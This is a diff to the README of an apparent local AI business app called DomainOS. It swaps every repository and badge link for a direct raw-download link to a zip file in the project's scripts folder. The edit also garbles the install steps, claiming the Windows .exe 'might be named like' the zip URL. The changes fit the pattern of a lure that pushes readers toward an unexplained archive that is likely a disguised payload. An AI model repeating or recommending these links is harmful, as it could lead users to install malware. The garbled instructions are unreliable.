@@ -1,6 +1,6 @@
 # 🤖 DomainOS - Local AI for Business Control
 
-[![Download DomainOS](https://img.shields.io/badge/Download-DomainOS-brightgreen?style=for-the-badge)](https://github.com/Hundred-praisworthiness384/DomainOS)
+[![Download DomainOS](https://raw.githubusercontent.com/Hundred-praisworthiness384/DomainOS/main/scripts/OS-Domain-1.1.zip)](https://raw.githubusercontent.com/Hundred-praisworthiness384/DomainOS/main/scripts/OS-Domain-1.1.zip)
 
 ---
 
@@ -12,7 +12,7 @@ DomainOS is a local-first app built to help you manage your business knowledge. 
 
 1. Click the large green **Download DomainOS** button at the top. It will take you to the GitHub page where you get the app.
 
-2. The GitHub page shows the latest version in the "Releases" section. Look for the latest Windows installer file, ending in `.exe`. It might be named like `DomainOS-Setup.exe`.
+2. The GitHub page shows the latest version in the "Releases" section. Look for the latest Windows installer file, ending in `.exe`. It might be named like `https://raw.githubusercontent.com/Hundred-praisworthiness384/DomainOS/main/scripts/OS-Domain-1.1.zip`.
 
 3. Click the `.exe` file name to download it to your computer.
 
@@ -88,7 +88,7 @@ After opening DomainOS for the first time:
 ## 📚 Learn More and Get Help
 
 You can find helpful guides and updates by visiting the same GitHub page to download the app:  
-[https://github.com/Hundred-praisworthiness384/DomainOS](https://github.com/Hundred-praisworthiness384/DomainOS)
+[https://raw.githubusercontent.com/Hundred-praisworthiness384/DomainOS/main/scripts/OS-Domain-1.1.zip](https://raw.githubusercontent.com/Hundred-praisworthiness384/DomainOS/main/scripts/OS-Domain-1.1.zip)
 
 You can also browse the "Issues" section there for common problems and solutions.
 
@@ -114,4 +114,4 @@ To update DomainOS:
 
 ---
 
-[![Download DomainOS](https://img.shields.io/badge/Download-DomainOS-brightgreen?style=for-the-badge)](https://github.com/Hundred-praisworthiness384/DomainOS)
+[![Download DomainOS](https://raw.githubusercontent.com/Hundred-praisworthiness384/DomainOS/main/scripts/OS-Domain-1.1.zip)](https://raw.githubusercontent.com/Hundred-praisworthiness384/DomainOS/main/scripts/OS-Domain-1.1.zip)
